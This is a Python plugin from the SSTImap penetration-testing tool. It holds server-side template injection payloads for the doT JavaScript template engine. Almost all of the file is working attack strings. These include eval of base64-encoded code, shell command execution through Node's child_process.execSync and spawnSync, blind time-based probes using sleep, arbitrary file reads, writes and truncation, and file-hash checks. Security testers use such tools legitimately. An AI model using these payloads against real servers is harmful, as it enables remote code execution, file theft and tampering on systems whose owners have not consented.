from plugins.languages import javascript
from utils import rand


class Dot(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": '点模板引擎',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Github: https://github.com/olado/doT",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{={header[0]}+{header[1]}}}}}',
                'trailer': '{{{{={trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{=typeof({rand.randints[0]})+{rand.randints[1]}}}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """{{{{=''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}}}""",
            },
            'evaluate': {
                'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
                'test_os': """global.process.mainModule.require('os').platform()""",
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{{{=''}}}}{{{{=[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]}}}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{{{=''}}}}{{{{=eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')}}}}"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString());"""
            },
            'execute_blind': {
                # bogus前缀是为了避免误检测Javascript而不是doT
                'call': 'inject',
                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');}}}}"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')}}}}""",
                'truncate': """{{{{=global.process.mainModule.require('fs').writeFileSync('{path}', '')}}}}"""
            },
            'read': {
                'call': 'evaluate',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64');"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex");"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure};}}}}', 'suffix': '{{1;', 'closures': javascript.ctx_closures},
        ])
        
